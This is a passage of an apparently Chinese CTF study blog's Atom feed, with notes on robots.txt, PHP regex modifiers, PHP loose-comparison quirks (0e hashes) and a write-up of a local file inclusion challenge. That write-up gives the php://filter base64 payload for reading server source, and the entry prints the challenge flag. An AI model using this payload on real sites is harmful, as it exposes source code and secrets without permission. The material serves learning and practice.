title="六、签到题"></a>六、签到题</h3><p>题目中提示关注公众号“中原工学院DROPS攻防训练营”，由于以前关注过了，所以刚开始没有重新关注，就一直没有得到flag，后来取消重新关注后，得到了flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一、根本想不到&quot;&gt;&lt;a href=&quot;#一、根本想不到&quot; class=&quot;headerlink&quot; title=&quot;一、根本想不到&quot;&gt;&lt;/a&gt;一、根本想不到&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;./images/1540816951270.png&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="后台登陆wordpress,图片隐写,加解密" scheme="http://yoursite.com/tags/%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86wordpress-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99-%E5%8A%A0%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>知识点</title>
    <link href="http://yoursite.com/2018/10/29/%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>http://yoursite.com/2018/10/29/知识点/</id>
    <published>2018-10-29T10:08:40.000Z</published>
    <updated>2018-10-29T12:38:43.314Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-robots-txt协议"><a href="#1-robots-txt协议" class="headerlink" title="1. robots.txt协议"></a>1. robots.txt协议</h3><a id="more"></a><p>robots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的。<br>当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。<br>例如：</p><p><img src="./images/Image.png" alt="enter description here" title="Image"></p><p>一般网站都会有robots.txt文件的，存放可以直接访问的文件子目录</p><h3 id="2、正则字符串"><a href="#2、正则字符串" class="headerlink" title="2、正则字符串"></a>2、正则字符串</h3><p>preg_match — 执行匹配正则表达式</p><p>preg_match()返回 pattern 的匹配次数，它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索</p><p>/号之间的内容为正则模式串，后一个/之后的内容标识其它信息，例如这里的i标识大小写不敏感。</p><p>{n,m} ：m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</p><p>.   匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。</p><p><em>匹配前面的子表达式零次或多次。要匹配 </em> 字符，请使用 *。</p><p>[a-z]:  字符范围。匹配指定范围内的任意字符。例如，’[a-z]’ 可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。</p><p>[[:punct:]]代表任意符号，非字母数字</p><p>正则表达式中常用的模式修正符有i、g、m、s、U、x、a、D、e 等。它们之间可以组合搭配使用。</p><p>i 不区分(ignore)大小写；<br>例如: /abc/i 可以匹配 abc、aBC、Abc</p><p>g 全局(global)匹配<br>如果不带g，正则过程中字符串从左到右匹配，找到第一个符合条件的即匹配成功，返回<br>如果带g，则字符串从左到右，找到每个符合条件的都记录下来，知道字符串结尾位置<br>例如:</p><figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var str = <span class="string">'aaaaaaaa'</span></span><br><span class="line">var reg1 = /a/; str.match(reg1) // 结果为：[<span class="comment">"a"</span>, index: <span class="number">0</span>, input: <span class="comment">"aaaaaaaa"</span>]</span><br><span class="line">var reg2 = /a/g; str.match(reg2) // 结果为：[<span class="comment">"a"</span>, <span class="comment">"a"</span>, <span class="comment">"a"</span>, <span class="comment">"a"</span>, <span class="comment">"a"</span>, <span class="comment">"a"</span>, <span class="comment">"a"</span>, <span class="comment">"a"</span>]</span><br></pre></td></tr></table></figure><p>m 多(more)行匹配</p><p>若存在换行\n并且有开始^或结束$符的情况下，和g一起使用实现全局匹配,<br>因为存在换行时默认会把换行符作为一个字符任务匹配字符串是个单行，<br>g只匹配第一行，添加m之后实现多行，每个换行符之后就是开始</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"abcggab\nabcoab"</span>;</span><br><span class="line"><span class="keyword">var</span> preg1 = /^abc/gm; str.<span class="keyword">match</span>(preg1) // 结果为：[<span class="string">"abc"</span>, <span class="string">"abc"</span>]</span><br><span class="line"><span class="keyword">var</span> preg2 = /ab$/gm; str.<span class="keyword">match</span>(preg2) // 结果为：[<span class="string">"ab"</span>, <span class="string">"ab"</span>]</span><br></pre></td></tr></table></figure><p>s 特殊字符圆点 . 中包含换行符<br>默认的圆点 . 是 匹配除换行符 \n 之外的任何单字符，加上s之后, . 中包含换行符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>str = "abggab\nacbs";</span><br><span class="line"><span class="meta">$</span>preg = "/b./s";</span><br><span class="line"><span class="meta">preg_match_all($</span>preg, $str,$matchs);</span><br><span class="line"><span class="meta">print_r($</span>matchs);//Array ( [0] =&gt; Array ( [0] =&gt; bg [1] =&gt; b [2] =&gt; bs ) )</span><br></pre></td></tr></table></figure><p>U 只匹配最近的一个字符串;不重复匹配;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$mode=<span class="string">"/a(.*?)c/"</span>;</span><br><span class="line">$preg=<span class="string">"/a.*c/U"</span>;<span class="comment">//这两个正则返回相同的值</span></span><br><span class="line">$str=<span class="string">"abcabbbcabbbbbc"</span> ;</span><br><span class="line">preg_match($mode,$str,$content); <span class="keyword">echo</span> $content[<span class="number">0</span>];<span class="comment">//abc</span></span><br><span class="line">preg_match($preg,$str,$content); <span class="keyword">echo</span> $content[<span class="number">0</span>];<span class="comment">//abc</span></span><br><span class="line"><span class="comment">//修正符:x 将模式中的空白忽略;</span></span><br><span class="line"><span class="comment">//修正符:A 强制从目标字符串开头匹配;</span></span><br><span class="line"><span class="comment">//修正符:D 如果使用$限制结尾字符,则不允许结尾有换行; </span></span><br><span class="line"><span class="comment">//修正符:e 配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-robots-txt协议&quot;&gt;&lt;a href=&quot;#1-robots-txt协议&quot; class=&quot;headerlink&quot; title=&quot;1. robots.txt协议&quot;&gt;&lt;/a&gt;1. robots.txt协议&lt;/h3&gt;
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="robots协议,正则" scheme="http://yoursite.com/tags/robots%E5%8D%8F%E8%AE%AE-%E6%AD%A3%E5%88%99/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://yoursite.com/2018/09/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/2018/09/30/文件包含/</id>
    <published>2018-09-30T10:33:22.000Z</published>
    <updated>2018-10-28T05:16:16.878Z</updated>
    
    <content type="html"><![CDATA[<h2 id="南邮文件包含ctf题"><a href="#南邮文件包含ctf题" class="headerlink" title="南邮文件包含ctf题"></a>南邮文件包含ctf题</h2><p><img src="https://i.imgur.com/5QJFWhR.png" alt=""></p><a id="more"></a><hr><p><img src="https://i.imgur.com/7vQRioW.png" alt=""></p><p><img src="https://i.imgur.com/gUBH2rU.png" alt=""></p><p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，<br>从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。</p><p>详细的本地文件包含漏洞介绍： <a href="https://www.cnblogs.com/wh4am1/p/6542398.html" target="_blank" rel="noopener">https://www.cnblogs.com/wh4am1/p/6542398.html</a></p><p>我们从第三幅图中很明显的看出这是个php文件，但是无法通过查看源码得到有效信息，因此尝试使用php://filter获取源码。</p><p>php://filter是PHP中的一个协议，利用这个协议我们可以解决一些ctf的题目，或者挖掘出一些漏洞。</p><pre><code>php:// — 访问各个输入/输出流（I/O streams）php://input 是个可以访问请求的原始数据的只读流。php://filter 是一种设计用来允许过滤器程序在打开时成为流的封装协议。这对于单独具有完整功能的文件函数非常有用，否则就没有机会在读取内容之前将过滤器应用于流之上。该协议语法为：php://filter:/&lt;action&gt;=&lt;name&gt;比如 php://filter:/resource=http://www.baidu.com</code></pre><h3 id="使用-php-filter-获取网页内容："><a href="#使用-php-filter-获取网页内容：" class="headerlink" title="使用 php://filter 获取网页内容："></a>使用 php://filter 获取网页内容：</h3><pre><code>&lt;?php$url = &apos;http://www.phpfamily.cn&apos;;$data = file_get_contents(&apos;php://filter/resource=&apos; . $url);echo $data;  //输出结果我http://www.phpfamily.cn页面的内容</code></pre><h3 id="php-filter-的参数列表"><a href="#php-filter-的参数列表" class="headerlink" title="php://filter 的参数列表"></a>php://filter 的参数列表</h3><ul><li>resource=&lt;要过滤的数据流&gt;          指定了你要筛选过滤的数据流。     （必选）</li><li>read=&lt;读链的筛选列表&gt;     可以设定一个或多个过滤器名称，以管道符（|）分隔。 （可选）</li><li>write=&lt;写链的筛选列表&gt;     可以设定一个或多个过滤器名称，以管道符（|）分隔。 （可选）</li><li>&lt;；两个链的筛选列表&gt;     任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</li></ul><h3 id="read参数值可为"><a href="#read参数值可为" class="headerlink" title="read参数值可为"></a>read参数值可为</h3><p>string.strip_tags： 将数据流中的所有html标签清除</p><p>string.toupper： 将数据流中的内容转换为大写</p><p>string.tolower： 将数据流中的内容转换为小写</p><p>convert.base64-encode： 将数据流中的内容转换为base64编码</p><p>convert.base64-decode： 与上面对应解码为典型的文件包含漏洞。</p><p>我们可以通过构造含有漏洞的语句，查看想要看的代码： file=php://filter/convert.base64-encode/resource=index.php 。再将得到的base64码解码即可。</p><p>在这道题中，我们就可以通过构造这样的语句查看隐藏的代码，如下网址:</p><p><img src="https://i.imgur.com/5m2c8p5.png" alt=""></p><p>然后在进行base64解码得到flag</p><p>flag:nctf{edulcni_elif_lacol_si_siht}</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;南邮文件包含ctf题&quot;&gt;&lt;a href=&quot;#南邮文件包含ctf题&quot; class=&quot;headerlink&quot; title=&quot;南邮文件包含ctf题&quot;&gt;&lt;/a&gt;南邮文件包含ctf题&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/5QJFWhR.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
      <category term="LFI" scheme="http://yoursite.com/tags/LFI/"/>
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="php://filter" scheme="http://yoursite.com/tags/php-filter/"/>
    
  </entry>
  
  <entry>
    <title>php</title>
    <link href="http://yoursite.com/2018/08/10/php/"/>
    <id>http://yoursite.com/2018/08/10/php/</id>
    <published>2018-08-10T01:31:50.000Z</published>
    <updated>2023-10-29T12:00:25.427Z</updated>
    
    <content type="html"><![CDATA[<p>php的详细使用可以参考<a href="http://php.net/manual/zh/" target="_blank" rel="noopener">http://php.net/manual/zh/</a></p><p>php关于==号是这样处理的，如果一边是整型，另一边也需要是整型。</p><a id="more"></a><pre><code>0e545993274517709034328855841020</code></pre><p>这是一个整数，在php里是理解为0*10^4549…20的意思，那么其值是0</p><p>同样</p><pre><code>0e342768416822451524974117254469</code></pre><p>这是一个整数，在php里是理解为0*10^34..69的意思，那么其值是0，两者就相等了</p><p>举一个反面的例子</p><p>1e1和1e2</p><p>这里1e1=1<em>10^1=10，1e2=1</em>10^2=100</p><p>所以1e1 == 1e2这是false，但是</p><p>100 == 1e2 这是true，为什么呢，因为1e2先转为整型，是100</p><p>注意，对于e是指幂次。而其他26字符并不具有此能力。</p><p>参考：</p><p><a href="http://php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.comparison.php</a></p><pre><code>&lt;?phpvar_dump(0 == &quot;all&quot;); // 0 == 0 -&gt; truevar_dump(&quot;1&quot; == &quot;01&quot;); // 1 == 1 -&gt; truevar_dump(&quot;10&quot; == &quot;1e1&quot;); // 10 == 10 -&gt; truevar_dump(100 == &quot;1e2&quot;); // 100 == 100 -&gt; trueswitch (&quot;a&quot;) {case 0:    echo &quot;0&quot;;    break;case &quot;a&quot;: // never reached because &quot;a&quot; is already matched with 0    echo &quot;a&quot;;    break;}?&gt;</code></pre><p>做比较，会先转换类型， all字符串转换成数字类型(int)就是 0 ， 所以中间成立返回真。</p><pre><code>var_dump(08==8)这个结果返回是false，var_dump(09==9)这个结果返回也是false，而var_dump(07===7)返回true（var_dump(07==7)同样返回true。）</code></pre><p>php手册上有详细说明，整形以0开头的为八进制数，如果向八进制数传递了一个非法数字（即 8 或 9），则后面其余数字会被忽略，即09实际上为0，08也同理</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php的详细使用可以参考&lt;a href=&quot;http://php.net/manual/zh/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://php.net/manual/zh/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;php关于==号是这样处理的，如果一边是整型，另一边也需要是整型。&lt;/p&gt;
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/categories/php/"/>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
</feed>
